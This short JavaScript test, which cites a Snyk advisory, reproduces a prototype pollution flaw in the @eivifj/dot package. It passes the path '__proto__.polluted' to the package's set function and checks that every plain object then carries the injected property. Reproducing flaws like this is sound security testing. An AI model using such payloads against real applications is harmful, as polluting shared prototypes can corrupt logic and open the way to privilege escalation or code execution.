//https://snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435
test("prototype pollution in @eivifj/dot", () => {
  const a = require("@eivifj/dot");
  const path = "__proto__.polluted";

  expect({}.polluted).toBe(undefined);

  a.set({}, path, "yes");

  expect({}.polluted).toBe("yes");
});
